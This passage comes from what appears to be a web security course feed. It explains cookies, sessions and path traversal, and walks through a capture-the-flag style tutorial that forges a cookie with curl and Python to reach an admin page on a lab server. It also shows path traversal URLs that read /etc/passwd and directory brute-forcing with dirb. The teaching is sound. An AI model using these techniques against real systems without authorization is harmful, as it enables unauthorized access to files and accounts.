&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;skill&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;infinite&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">response&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">req&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">post&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">f&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&lt;/span>&lt;span style="color:#4e9a06">{&lt;/span>&lt;span style="color:#000">URL&lt;/span>&lt;span style="color:#4e9a06">}&lt;/span>&lt;span style="color:#4e9a06">/post&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">data&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#000">payload&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="cookies">Cookies&lt;/h1>
&lt;p>HTTP is a stateless protocol used to communicate over the internet.
This means that a request is not aware of any of the previous ones and each request is executed independently.
Given its stateless nature, simple mechanisms such as HTTP cookies were created to overcome the issue.&lt;/p>
&lt;p>An HTTP cookie (also called web cookie, Internet cookie, browser cookie, or simply cookie) is a small piece of data sent from a website and stored on the user&amp;rsquo;s computer by the user&amp;rsquo;s web browser while the user is browsing.
Cookies were designed to be a reliable mechanism for websites to remember stateful information (such as items added in the shopping cart in an online store) or to record the user&amp;rsquo;s browsing activity (including clicking particular buttons, logging in, or recording which pages were visited in the past).
They can also be used to remember pieces of information that the user previously entered into form fields, such as names, addresses, passwords, and credit card numbers.&lt;/p>
&lt;p>&lt;img src="./assets/cookies.png" alt="Cookies">&lt;/p>
&lt;p>They are like ID cards for websites.
If a browser sends a certain cookie to a web server, the server deduces the identity of said client from that cookie, without requiring authentication.
This can pose problems from a security perspective.
For more details, check the section about &lt;a href="#cookie-theft--session-hijacking">cookie theft and session hijacking&lt;/a>.&lt;/p>
&lt;h2 id="what-are-cookies">What are Cookies?&lt;/h2>
&lt;p>A cookie is a key-value pair stored in a text file on the user’s computer.
This file can be found, for example, at the following path on a Linux system using Firefox:&lt;/p>
&lt;pre tabindex="0">&lt;code>~/.mozilla/firefox/&amp;lt;some_random_characters&amp;gt;.default-release/cookies.sqlite
&lt;/code>&lt;/pre>&lt;p>As the file name implies, Firefox stores cookies in an SQLite database.&lt;/p>
&lt;p>An example of cookies set for a website could be:&lt;/p>
&lt;ul>
&lt;li>&lt;code>username=admin&lt;/code>&lt;/li>
&lt;li>&lt;code>cookie_consent=1&lt;/code>&lt;/li>
&lt;li>&lt;code>theme=dark&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>The first cookie stores the username, so it can be displayed to the user without querying the database.
The second one stores the choice made by the user regarding their concent to receive cookies, so the application does not continue to show that annoying message every time.
Finally, the third one stores which theme was selected (in this case, a dark theme).&lt;/p>
&lt;p>Once a cookie has been set, the browser will send the cookie information in all subsequent HTTP requests until the cookie is deleted.
Cookies also have various attributes:&lt;/p>
&lt;ul>
&lt;li>&lt;code>Domain&lt;/code> and &lt;code>Path&lt;/code>: define the scope of the cookies.
These attributes tell the browser what website they belong to.&lt;/li>
&lt;li>&lt;code>Secure&lt;/code>: defines that cookies should only be sent using secure channels such as HTTPS.&lt;/li>
&lt;li>&lt;code>Expires&lt;/code>: specifies when the cookie is to be deleted.
All cookies have a maximum lifespan, after which they must be erased by the browser, for security.
That why if you haven&amp;rsquo;t logged on a website for a long time, you will be logged out.
&lt;ul>
&lt;li>Alternatively, the&lt;code>Max-Age&lt;/code> attribute can be used to state the number of seconds after the cookie is to be deleted.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="developer-tools">Developer Tools&lt;/h2>
&lt;p>All modern browsers have the ability to assist developers in creating, previewing, testing and debugging their web applications.
This ability comes in the form of the &lt;strong>Developer Tools&lt;/strong> suite.
You can open the Developer Tools by pressing either &lt;code>F12&lt;/code> or &lt;code>Ctrl + Shift + c&lt;/code> when browsing through a website.&lt;/p>
&lt;p>&lt;img src="./assets/developer-tools.png" alt="Developer Tools - First Sight">&lt;/p>
&lt;h3 id="inspector">Inspector&lt;/h3>
&lt;p>The first &amp;ldquo;tab&amp;rdquo; we see in the Developer Tools is called &lt;em>Inspector&lt;/em>.
It displays the HTML source of the page we are viewing.
This structure is called the &lt;a href="../explaining-the-internet#the-document-object-model-dom">Document Object Model&lt;/a>.
We can even modify the content of the HTML document&lt;/p>
&lt;p>&lt;img src="./assets/inspector-modify-title.png" alt="Modified Title">&lt;/p>
&lt;p>Of course, this modification is only visible to me because I&amp;rsquo;m modifying my local copy of the &lt;code>index.html&lt;/code> file.&lt;/p>
&lt;h3 id="console">Console&lt;/h3>
&lt;p>This tab is pretty straightforward.
It is a shell in which we can write JavaScript code.&lt;/p>
&lt;p>&lt;img src="./assets/console.png" alt="Console">&lt;/p>
&lt;h3 id="debugger">Debugger&lt;/h3>
&lt;p>This tab displays all the files loaded by the web page and allows you to run the JavaScript code step by step.
Hence its name: &lt;em>Debugger&lt;/em>&lt;/p>
&lt;h4 id="sources">Sources&lt;/h4>
&lt;p>The &amp;ldquo;Sources&amp;rdquo; sub-tab of the &amp;ldquo;Debugger&amp;rdquo; tab shows the hierarchical structure of all files used by the web page.
These files can be HTML files, CSS files images, videos, JavaScript files, anything.&lt;/p>
&lt;p>&lt;img src="./assets/debugger-sources.png" alt="Debugger - Source">&lt;/p>
&lt;p>Notice the file &lt;code>(index)&lt;/code> is actually the same we saw in &lt;a href="#inspector">Inspector&lt;/a>.&lt;/p>
&lt;h3 id="network">Network&lt;/h3>
&lt;p>&lt;img src="./assets/network.png" alt="Network">&lt;/p>
&lt;p>The network tab shows detailed information about every file loaded and every request and response made by the page.
Notice the sub-tabs to the right.
here you can find in-depth information about the HTTP requests, such as HTTP parameters, HTTP methods (&lt;code>GET&lt;/code>, &lt;code>POST&lt;/code> etc.), HTTP status codes (200, 404, 500, etc.), loading time and size of each loaded element (image, script, etc).
Furthermore, clicking on one of the requests there, you can see the headers, the preview, the response (as raw content) and others.
This is useful for listing all the resources needed by a page, such as if there are any requests to APIs, additional scripts loaded, etc.&lt;/p>
&lt;p>Here we can also see the cookies sent with each request.&lt;/p>
&lt;p>&lt;img src="./assets/network-cookies.png" alt="Network - Cookies">&lt;/p>
&lt;h3 id="storage">Storage&lt;/h3>
&lt;p>Viewing cookies in the &amp;ldquo;Network&amp;rdquo; tab is fine, but that only gives us their value.
If we want to see all their attributes &lt;strong>and change their value&lt;/strong>, we need to go over to the &amp;ldquo;Storage&amp;rdquo; tab.&lt;/p>
&lt;p>&lt;img src="./assets/_ga-cookie.png" alt="Storage">&lt;/p>
&lt;p>Let&amp;rsquo;s take a closer look at one cookie called &lt;code>_ga&lt;/code>.
It comes form &amp;ldquo;Google Analytics&amp;rdquo;.
This is a service provided by Google that &lt;strong>definitely does not spy on users&lt;/strong>, but it uses &lt;a href="https://developers.google.com/analytics/devguides/collection/gtagjs/cookie-usage#gtagjs_google_analytics_4_-_cookie_usage">cookies like this one&lt;/a> to give website owners statistics about their visitors.
So it&amp;rsquo;s literally spying and tracking users&amp;rsquo; behaviour.&lt;/p>
&lt;p>Let&amp;rsquo;s troll them by modifying their cookie
Its contents are explained &lt;a href="https://stackoverflow.com/a/16107194">here&lt;/a>.
But we&amp;rsquo;re just going to mess with it.&lt;/p>
&lt;p>&lt;img src="./assets/_ga-cookie-modified.png" alt="Storage - Modified">&lt;/p>
&lt;p>There!
We showed Big Tech not to mess with us!&lt;/p>
&lt;h2 id="cookies-from-the-cli">Cookies from the CLI&lt;/h2>
&lt;p>We&amp;rsquo;re going to use our old friend &lt;code>curl&lt;/code>.
To set a cookie we simply use the &lt;code>-b&lt;/code> parameter like so:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -b &amp;#39;something=nothing&amp;#39; -b &amp;#39;something_else=still_nothing&amp;#39; $URL
&lt;/code>&lt;/pre>&lt;h1 id="http-sessions">HTTP Sessions&lt;/h1>
&lt;p>Some websites use sessions to remember their clients across multiple requests.
These sessions are essentially IDs with which the server identifies clients.
For example, PHP uses a cookie called &lt;code>PHPSESSID&lt;/code>.
It contains a random large number.&lt;/p>
&lt;p>Sessions are usually short-lived, which makes them ideal for storing temporary states between pages.
Sessions also expire once the user closes his browser or after a predefined amount of time (for example, 30 minutes).&lt;/p>
&lt;p>The basic workflow is:&lt;/p>
&lt;ol>
&lt;li>The server starts a new session (sets a cookie via the HTTP &lt;code>Cookie&lt;/code> header).&lt;/li>
&lt;li>The server sets a new session variable (stored on the server-side).&lt;/li>
&lt;li>When the client changes the page, it sends all the cookies in the request, along with the session ID from step 1.&lt;/li>
&lt;li>The server reads the session ID from the cookie.&lt;/li>
&lt;li>The server matches the session ID with the entries of a local list (in-memory, text file etc.).&lt;/li>
&lt;li>If the server finds a match, it reads the stored variables.
For PHP, these variables will become available in the superglobal variable &lt;code>$_SESSION&lt;/code>.&lt;/li>
&lt;li>If the server doesn&amp;rsquo;t find a match, it will create a new session and repeat steps 1-6.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="./assets/session.jpg" alt="Session lifecycle">&lt;/p>
&lt;p>Example of a session in PHP (running on the server):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">session_start&lt;/span>&lt;span style="color:#000;font-weight:bold">();&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// Start the session
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#000">$_SESSION&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;John Doe&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$_SESSION&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;is_admin&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87;font-weight:bold">true&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Hello &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span> &lt;span style="color:#000">$_SESSION&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sessions-in-the-cli">Sessions in the CLI&lt;/h3>
&lt;p>Guess who&amp;rsquo;s back?
&lt;code>curl&lt;/code>, of course.
We can save the cookies sent by a server in a &lt;strong>cookie jar&lt;/strong>.
Remember this concept.
Python uses it too.
It&amp;rsquo;s not too sophisticated, either.
A cookie jar is a file that contains cookies.&lt;/p>
&lt;p>To save the cookies in a file, we use the &lt;code>-c &amp;lt;file name&amp;gt;&lt;/code> option&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -c cookies.txt $URL
[...]
root@kali:~# cat cookies.txt
# Netscape HTTP Cookie File
# https://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
sample.domain.com FALSE / FALSE 1656864260 something nothing
&lt;/code>&lt;/pre>&lt;p>Each entry in a cookies file represents a cookie.
Its layout is:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;domain&amp;gt; &amp;lt;include subdomains&amp;gt; &amp;lt;path&amp;gt; &amp;lt;HTTPS only&amp;gt; &amp;lt;expires at&amp;gt; &amp;lt;cookie name&amp;gt; &amp;lt;cookie value&amp;gt;
&lt;/code>&lt;/pre>&lt;p>We are free to modify this cookies file however we want.
As you can see, this file has a very specific format.
It&amp;rsquo;s better to let &lt;code>curl&lt;/code> generate it first to make sure it&amp;rsquo;s correct and only then edit it ourselves.
Then, in order to use these cookies in a subsequent request, we use the &lt;code>-b&lt;/code> parameter:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -b cookies.txt $URL
&lt;/code>&lt;/pre>&lt;p>Notice it&amp;rsquo;s the same parameter we used to &lt;a href="#cookies-from-the-cli">send cookies manually&lt;/a>.
When the argument is a file, &lt;code>curl&lt;/code> reads the cookies form the file.
Otherwise, it reads them from the argument itself as strings.&lt;/p>
&lt;h3 id="sessions-in-python">Sessions in Python&lt;/h3>
&lt;p>In order to send HTTP requests in Python, we can import the &lt;code>requests&lt;/code> module.
Then, we simply create a session object which we then use to send requests.
This object also maintains the session cookies.
They are accessible via &lt;code>session.cookies&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">s&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">requests&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">Session&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Set the value of the `something` cookie to `nothing`.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">s&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">cookies&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">set&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;something&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;nothing&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Send a `GET` request with the above cookie.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">s&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">URL&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="path-traversal">Path Traversal&lt;/h1>
&lt;p>Every request asks for a file.
Remember &lt;code>GET /path/to/file&lt;/code>.
Even &lt;code>GET /&lt;/code> implicitly asks for &lt;code>index.html&lt;/code> or &lt;code>index.php&lt;/code>.&lt;/p>
&lt;p>If the application does not verify the parameter, an attacker might be able to exploit the application and display an arbitrary file from the target system.
Normally an attacker would try to access sensitive files containing passwords or configurations in order to gain access to the system.
Remember that PHP scripts aren&amp;rsquo;t normally visible by the client.&lt;/p>
&lt;p>Below is an example of a vulnerability where an attacker can leak PHP scripts:
Consider the following URL:&lt;/p>
&lt;pre tabindex="0">&lt;code>http://somesite.com/view.php?file=image.jpg
&lt;/code>&lt;/pre>&lt;p>What if the attacker could query the website using &lt;code>view.php&lt;/code> as parameter?&lt;/p>
&lt;pre tabindex="0">&lt;code>http://somesite.com/view.php?file=view.php
&lt;/code>&lt;/pre>&lt;p>This would be too easy.
Sometimes, images are stored in different directories than application files.
So our attacker should query the server like with a link like this one:&lt;/p>
&lt;pre tabindex="0">&lt;code>http://somesite.com/view.php?file=../../view.php
&lt;/code>&lt;/pre>&lt;p>If they manage to view &lt;code>view.php&lt;/code>, then it is likely they can access any file on the system, such as &lt;code>/etc/passwd&lt;/code>, using this query:&lt;/p>
&lt;pre tabindex="0">&lt;code>http://somesite.com/view.php?file=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>This kind of situation when an attacker can freely access files on the server is called a &lt;strong>path traversal attack&lt;/strong>.
To fix this, applications should always validate user input and ensure the path they request is within a safe folder to which they have access.&lt;/p>
&lt;h2 id="directory-buster-dirb">DIRectory Buster (DIRB)&lt;/h2>
&lt;p>There may be other files stored on the server that aren&amp;rsquo;t accessible from the entry point web page.
It is difficult to search for such pages manually.
Luckily there are tools that can help us with this.
One of them is &lt;strong>DIRectory Buster&lt;/strong>, or &lt;code>dirb&lt;/code> in short.
It simply queries a web server for many files &lt;strong>fast&lt;/strong>.
All you need to do is to give it a list of files for which to search.&lt;/p>
&lt;p>Here&amp;rsquo;s how to run it:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# dirb &amp;lt;URL&amp;gt; wordlist.txt
&lt;/code>&lt;/pre>&lt;p>A good starting point for wordlists are the lists &lt;a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content">here&lt;/a>, particularly those named &lt;code>raft-large-*.txt&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>raft-large-files.txt&lt;/code> for files, duh&amp;hellip;&lt;/li>
&lt;li>&lt;code>raft-large-directories.txt&lt;/code> for directories&lt;/li>
&lt;/ul>
&lt;p>&lt;code>dirb&lt;/code> works by issuing lots of &lt;code>GET&lt;/code> requests, one for each file in its wordlist.
If a request receives a 404 response, the file doesn&amp;rsquo;t exist.
Otherwise, it does (except for 500 responses, in which case the request is resent).
Even a 403 response is alright.
It just means that a regular user doesn&amp;rsquo;t have access to that file.&lt;/p>
&lt;p>Here&amp;rsquo;s what &lt;code>dirb&lt;/code> + &lt;a href="https://github.com/danielmiessler/SecLists">&lt;code>SecLists&lt;/code>&lt;/a> look like:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# dirb http://example.com ~/SecLists/Discovery/Web-Content/raft-large-files.txt
[...]
---- Scanning URL: http://example.com/ ----
+ http://example.com/index.html (CODE:200|SIZE:1256)
+ http://example.com/. (CODE:200|SIZE:1256)
+ http://example.com/extension.inc (CODE:403|SIZE:345)
[...]
&lt;/code>&lt;/pre>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>The key takeaways from this session are:&lt;/p>
&lt;ul>
&lt;li>HTTP cookies are used to make the protocol stateful.
You can pass them with &lt;code>curl&lt;/code> by using the &lt;code>-b&lt;/code> parameter&lt;/li>
&lt;li>Sessions are cookies used to identify a client.
Both &lt;code>curl&lt;/code> and Python can account for sessions:
&lt;ul>
&lt;li>&lt;code>curl&lt;/code> does so by saving and loading them from a cookie file with the &lt;code>-c&lt;/code> and &lt;code>-c&lt;/code> parameters, respectively&lt;/li>
&lt;li>Python uses a &lt;code>Session&lt;/code> object that stores cookies internally&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>In path traversal attacks hackers can access files they shouldn&amp;rsquo;t be allowed to by specifying the path to them
&lt;ul>
&lt;li>A very useful tool for testing the existence of additional files is &lt;code>dirb&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>One of the most widely used repositories of lists of common names / passwords / anything is &lt;a href="https://github.com/danielmiessler/SecLists">SecLists&lt;/a>.
Use it any time.&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;h2 id="tutorial---chef-hacky-mchack">Tutorial - Chef Hacky McHack&lt;/h2>
&lt;p>We&amp;rsquo;ll solve this task in 3 ways: from the browser, from the CLI and using Python.
That good we are!&lt;/p>
&lt;h3 id="virgin-from-the-browser">Virgin: From the Browser&lt;/h3>
&lt;p>We visit to the URL, open the Developer Tools and go over to the &amp;ldquo;Storage&amp;rdquo; tab.
There we see the server has given ass the cookie &lt;code>u=guest&lt;/code>.&lt;/p>
&lt;p>&lt;img src="./assets/hacky-mchack-cookies.png" alt="Hacky McHack - Initial Cookie">&lt;/p>
&lt;p>Since the challenge is called &amp;ldquo;Hacky McHack&amp;rdquo; we set the cookie value to &lt;code>hacky mchack&lt;/code>.
We notice a new tab has appeared at the top of the page or by inspecting the HTML source: &lt;strong>Manage&lt;/strong> (&lt;code>/manage.php&lt;/code>).
We click on it and get the flag.&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;ul class=&amp;#34;nav-menu list-unstyled&amp;#34;&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;index.php&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#about&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#portfolio&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Portfolio&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#journal&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Blog&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;#contact&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;manage.php&amp;#34; class=&amp;#34;smoothScroll&amp;#34;&amp;gt;Manage&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="chad-v1-from-the-cli">Chad v1: From the CLI&lt;/h3>
&lt;p>We use our good friend &lt;code>curl&lt;/code>.
First, we save the cookies from the initial page into a cookie jar.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -c cookies.txt http://141.85.224.70:8010
[...]
root@kali:~# cat cookies.txt
# Netscape HTTP Cookie File
# https://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
http://141.85.224.70:8010 FALSE / FALSE 1656864260 u guest
&lt;/code>&lt;/pre>&lt;p>Now we edit the file and replace &lt;code>guest&lt;/code> with &lt;code>hacky mchack&lt;/code> and send a &lt;code>GET&lt;/code> request to &lt;code>/manage.php&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# sed -i s/guest/hacky\ mchack/ cookies.txt
root@kali:~# curl -b cookies.txt $URL/manage.php
&lt;/code>&lt;/pre>&lt;p>If we didn&amp;rsquo;t want to use the cookie jar, we could have simply looked at the headers sent by the server then sent the cookie &amp;ldquo;manually&amp;rdquo;:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v $URL &amp;gt; /dev/null # we don&amp;#39;t care about the output
[...]
&amp;lt; HTTP/1.1 200 OK
&amp;lt; Date: Sun, 03 Jul 2022 16:10:51 GMT
&amp;lt; Server: Apache/2.4.38 (Debian)
&amp;lt; X-Powered-By: PHP/7.2.34
&amp;lt; Set-Cookie: u=guest; expires=Sun, 03-Jul-2022 16:11:51 GMT; Max-Age=60
root@kali:~# curl -b &amp;#39;u=hacky mchack&amp;#39; $URL/manage.php # Notice the Set-Cookie field above
&amp;lt;here we get the flag&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="chad-v2-from-python">Chad v2: From Python&lt;/h3>
&lt;p>Simply create a &lt;code>Session&lt;/code> object, set the cookie &lt;code>u&lt;/code> to &lt;code>hacky mchack&lt;/code>, then send a &lt;code>GET&lt;/code> request to the &lt;code>/manage.php&lt;/code> endpoint.&lt;/p>
&lt;h3 id="challenge-beep-beep-boop">Challenge: Beep Beep Boop&lt;/h3>
&lt;p>Look for hidden files on the web server.&lt;/p>
&lt;h3 id="challenge-colours">Challenge: Colours&lt;/h3>
&lt;p>Indices go brrrrrrr.&lt;/p>
&lt;h3 id="challenge-great-names">Challenge: Great Names&lt;/h3>
&lt;p>Do you know these great explorers?&lt;/p>
&lt;h3 id="challenge-nobody-loves-me">Challenge: Nobody Loves Me&lt;/h3>
&lt;p>Whom do you call?&lt;/p>
&lt;h3 id="challenge-one-by-one">Challenge: One-by-One&lt;/h3>
&lt;p>One by one by one by one by one&amp;hellip;&lt;/p>
&lt;h3 id="challenge-produce-consume">Challenge: Produce-Consume&lt;/h3>
&lt;p>What does the server produce exactly?&lt;/p>
&lt;h3 id="challenge-traverse-the-universe">Challenge: Traverse the Universe&lt;/h3>
&lt;p>Explore new ~planets~ files.&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;h2 id="cookie-theft--session-hijacking">Cookie Theft / Session Hijacking&lt;/h2>
&lt;p>Enter Facebook then close the tab.
Next time you won&amp;rsquo;t be asked to login.
This is because Facebook has given you a session ID with which you no longer need to log in.
It would be a pity if an attacker stole your ID.
This is what&amp;rsquo;s called &lt;strong>cookie theft&lt;/strong> or &lt;strong>session Hijacking&lt;/strong>.&lt;/p>
&lt;p>It&amp;rsquo;s a pretty common attack that mostly requires the user to click on a malicious link that leads to a webpage whose JavaScript code reads the victim&amp;rsquo;s cookies.
Following this attack, hackers can impersonate you wherever you were logged in.&lt;/p>
&lt;p>&lt;a href="https://www.venafi.com/blog/what-session-hijacking">Here&lt;/a> are more ways in which your session can be stolen.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/data-representation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/data-representation/</guid><description>
&lt;h1 id="data-representation">Data Representation&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;p>Use &lt;a href="https://github.com/ekalinin/github-markdown-toc">gh-md-toc&lt;/a>.&lt;/p>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Objectives and rationale for the current session.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;ul>
&lt;li>Information required for this section&lt;/li>
&lt;li>Commands / snippets that should be known, useful to copy-paste throughout the practical session&lt;/li>
&lt;/ul>
&lt;h2 id="content-sections">Content Sections:&lt;/h2>
&lt;ul>
&lt;li>Content split in sections, according to session specifics&lt;/li>
&lt;li>Demos will be part of the session presentation and will be referenced (snippets, images, links) in the content&lt;/li>
&lt;/ul>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;ul>
&lt;li>Sumamrizing session concepts&lt;/li>
&lt;li>Summarizing commands / snippets that are useful for tutorials, challenges (easy reference, copy-paste)&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;p>Tasks for the students to solve. They may be of two types:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Tutorials&lt;/strong> - simpler tasks accompanied by more detailed, walkthrough-like explanations&lt;/li>
&lt;li>&lt;strong>Challenges&lt;/strong> - the good stuff&lt;/li>
&lt;/ul>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;p>Any links or references to extra information.&lt;/p></description></item><item><title>Web:</title><link>/web/recon-enumeration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/recon-enumeration/</guid><description>
&lt;h1 id="recon--enumeration--recap">Recon &amp;amp; Enumeration &amp;amp; Recap&lt;/h1>
&lt;p>When it comes to hacking, knowledge is power.
The more knowledge you have about a target system or network, the more options you have available.
This session will put together all you have learned so far to give you an overview of how to approach a given target you want to exploit.
You will also find out about some more security tools that can help you automate the process.&lt;/p>
&lt;h2 id="phases-of-penetration-testing">Phases of Penetration Testing&lt;/h2>
&lt;p>Penetration testing is an authorized simulated cyber attack on a computer system, performed to evaluate its security.&lt;/p>
&lt;p>A standard penetration testing flow implies 5 stages:&lt;/p>
&lt;ol>
&lt;li>&lt;strong>reconnaissance&lt;/strong> - gathering information about the target system: website technologies, subdomains, open ports, Google hacking&lt;/li>
